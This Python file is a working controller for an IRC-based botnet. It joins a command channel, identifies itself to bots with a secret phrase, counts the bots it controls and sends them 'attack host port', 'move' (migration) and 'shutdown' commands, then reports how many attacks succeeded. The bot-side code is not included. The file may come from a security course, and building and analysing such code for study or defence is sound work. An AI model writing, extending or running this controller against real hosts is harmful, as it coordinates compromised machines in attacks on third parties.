import sys
import random
import socket
import string
import time
import re
import select

# Function to get a nick with a high probability of being unique by using randomness
def getNick():
    rootOfName = "minion"
    candidateTail = ""
    for _ in range(4):
        candidateTail = candidateTail + str(random.choice(string.ascii_letters + string.digits))
    return (rootOfName + candidateTail)

# Function to connect to IRC server and send NICK and USER messages
# Will also join CHANNEL if it exist and create it if it doesnt
def connectToIRC():
    global IRCconnection
    global nick
    try:
        debug("Connecting to IRC channel")
        print("Starting IRC server connection...")
        IRCconnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)       # Create socket for TCP connection to IRC channet
        IRCconnection.connect((HOSTNAME,PORT))                                  # Connect to cmd line specified host and port
        print("Connected to IRC server at " + HOSTNAME)
        nickSet = False
        while(nickSet == False):
            debug("Getting nick")
            candidateNick = getNick()
            NICK_Msg = "NICK " + candidateNick +"\r\n"                          # Construct NICK message
            USER_Msg = "USER " + candidateNick + " * * :Not Yourconsern\r\n"    # Construct USER message
            IRCconnection.sendall(NICK_Msg.encode("utf-8"))                     # Send NICK message
            IRCconnection.sendall(USER_Msg.encode("utf-8"))
            NICK_Response = IRCconnection.recv(512)                             # Recieve NICK response of 512 characters max for IRC protocol
            print(NICK_Response.decode("utf-8"))
            NICK_Response = NICK_Response.split()
            if((NICK_Response[1]).decode("utf-8") == "001"):
                debug("Nick confirmed with channel")
                nick = candidateNick                                            # If nick is not in use already, set global nick variable
                nickSet = True                                                  # Change nickSet flag to true
                joinChannel(CHANNEL, SECRET_PHRASE)                             # Authenticates to bots that it is the controller
    except Exception as e:
        debug("Error in connectToIRC")
        print("Error: " + str(e))
        time.sleep(TIMEOUT)

def joinChannel(chann, secret):
    joinMessage = "JOIN #" + chann + "\r\n"
    IRCconnection.sendall(joinMessage.encode("utf-8"))
    response = IRCconnection.recv(512)
    print(response.decode("utf-8"))
    pvtmsgToChannel(secret[1:])
    return

# Function that monitors IRC message and stdin traffic
def listen():
    while True:
        print("Controller is running. \nConnected with nick: " + nick + "\nConnected on channel: " + CHANNEL)
        sys.stdout.write("Enter a command: ")
        sys.stdout.flush()
        inputs = [sys.stdin, IRCconnection]
        outputs = [sys.stdout]
        readers, writers, errors, = select.select(inputs, [], [])
        try:
            for reader in readers:
                if reader is IRCconnection:
                    print("\nReading from IRC")
                    ircmessage = IRCconnection.recv(512)
                    ircmessage = ircmessage.decode("utf-8")
                    splitmessage = ircmessage.split()
                    if(ircmessage.isspace()):                                           # Server trying to kick bot
                        IRCconnection.close()                                           # Close connection to IRC
                        return                                                          # Attempt to reconnect in main
                    else:
                        if((len(splitmessage) > 0) and (splitmessage[0] == "PING")):     # Prevent inactive connection from closing
                            IRCconnection.sendall(b'PONG\r\n')
                        elif "JOIN" in splitmessage:
                            pvtmsgToChannel(SECRET_PHRASE[1:])
                        elif "QUIT" in splitmessage:
                            bot = (splitmessage[0].split("!"))[0][1:]
                            print(bot + " has exited")

                elif reader is sys.stdin:
                    getCommand()
        except Exception as e:
            debug("Error in listen")
            print("Error: " + str(e))
            return

# Function that reads the command input from the user
def getCommand():
    atck = re.compile('attack\s(\S+\.?\S+)+\s\d+')
    mv = re.compile('move\s(\S+\.?\S+)+\s\d+\s\S+')
    gettingCmdFlag = True
    host = ""
    port = 0
    try:
        cmd = sys.stdin.readline()
        cmd = cmd.strip()
        if cmd == "status":
            status(cmd)
        elif atck.match(cmd) and (len(cmd.split()) == 3):
            attack(cmd)
        elif mv.match(cmd) and (len(cmd.split()) == 4):
            migrate(cmd)
        elif cmd == "quit":
            quit()
        elif cmd == "shutdown":
            shutdown(cmd)
        else:
            print("Command " + cmd + " not valid.")
            return
    except Exception as e:
        debug("Error in getCommand")
        print("Error: " + str(e))
        return
    return

# Function that sends the nick of the bot to the controller via message to the channel
def pvtmsgToChannel(messageToSend):
    pvtMessage = "PRIVMSG #" + CHANNEL + " :" + messageToSend + "\r\n"
    IRCconnection.sendall(pvtMessage.encode("utf-8"))
    return

# Function that receives a response after issuing a command
def getData():
    try:
        reading = True
        message = ""
        print("Getting response from bot(s)")
        time.sleep(TIMEOUT)
        try:
            readers, _, _, = select.select([IRCconnection], [], [], 0)
            if len(readers) == 0:
                print("No response from bot(s)")
                return "0"
        except:
            print("No response from bot(s)")
            return "0"
        print("Received response from bot(s)")
        while reading:
            ircmessage = IRCconnection.recv(512)
            if len(ircmessage) != 512:
                reading = False
            ircmessage = ircmessage.decode("utf-8")
            message += ircmessage
    except Exception as e:
        debug("Error in getData")
        print("Error: " + str(e))
        return
    return message

#============================= Commands ==============================
def status(cmd):
    botCount = 0
    botList = []
    pvtmsgToChannel(cmd)
    message = getData()
    splitmessage = message.strip().split()
    for i in range(0, len(splitmessage)):
        if splitmessage[i] == "PRIVMSG":
            bot = splitmessage[i+2][1:]
            botList.append(bot)
            botCount += 1
    if len(botList) > 0:
        sys.stdout.write("Found " + str(botCount) + " bot(s):\n")
        col = 0
        for bot in botList[:-1]:
            if col < 6:
                sys.stdout.write(bot + ", ")
                col += 1
            else:
                sys.stdout.write(bot + ",\n")
                col = 0
        print(botList[-1] + ".")
    else:
        print("Found 0 bots.")
    return

def attack(cmd):
    suc = 0
    unsuc = 0
    pvtmsgToChannel(cmd)
    message = getData()
    splitmessage = message.strip().split()
    for i in range(0, len(splitmessage)):
        if splitmessage[i] == "PRIVMSG" and splitmessage[i+2][1:] == "attack":
            addr = splitmessage[i-1]
            bot = addr.split("!")[0][1:]
            if splitmessage[i+3] == "successful":
                suc += 1
                print(bot + ": attack successful")
            elif splitmessage[i+3] == "unsuccessful":
                unsuc += 1
                print(bot + ": attack unsuccessful")
    print("Total: " + str(suc) + " successful, " + str(unsuc) + " unsuccessful")
    return

def migrate(cmd):
    suc = 0
    pvtmsgToChannel(cmd)
    message = getData()
    splitmessage = message.strip().split()
    for i in range(0, len(splitmessage)):
        if splitmessage[i] == "PRIVMSG":
            for j in range(0, 10):
                if splitmessage[i+j].strip(".") == "successful":
                    suc += 1
                elif splitmessage[i+j] == "unsuccessful":
                    break
    print("Total: " + str(suc) + " successfully moved")
    return


def quit():
    IRCconnection.close()
    print("Controller is closed")
    sys.exit()

def shutdown(cmd):
    botCount = 0
    pvtmsgToChannel(cmd)
    message = getData()
    splitmessage = message.strip().split()
    for i in range(0, len(splitmessage)):
        if splitmessage[i] == "PRIVMSG" and splitmessage[i+2][1:] == "Shutdown":
            bot = splitmessage[i+1]
            print(bot + ": shutting down")
            botCount += 1
    print("Total: " + str(botCount) + " bot(s) shut down")
    return
#============================= // ==============================

def debug(s):
    if DEBUG:
        print("DEBUG: " + s)
    return

def main():
    global HOSTNAME
    global PORT
    global CHANNEL
    global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
    global shutdownFlag                                                         # Will only be true when controller issues 'shutdown' command
    global DEBUG
    global TIMEOUT

    TIMEOUT = 3
    DEBUG = False

    if len(sys.argv) == 6:
        if str(sys.argv[5]).lower() == "debug":
            DEBUG = True
    if len(sys.argv) >= 5:
        HOSTNAME = str(sys.argv[1])
        PORT = int(sys.argv[2])
        CHANNEL = str(sys.argv[3])
        SECRET_PHRASE = ":" + str(sys.argv[4])
        shutdownFlag = False                                                    # Bot will try to connect to HOSTNAME:PORT every 5 seconds unless this is set to True
        while(not shutdownFlag):
            connectToIRC()
            listen()
            time.sleep(TIMEOUT)                                                       # Wait 5 seconds before attempting to reconnect

    else:
        print("Error: wrong command line arguments", file = sys.stderr)

if __name__ == "__main__":
    main()
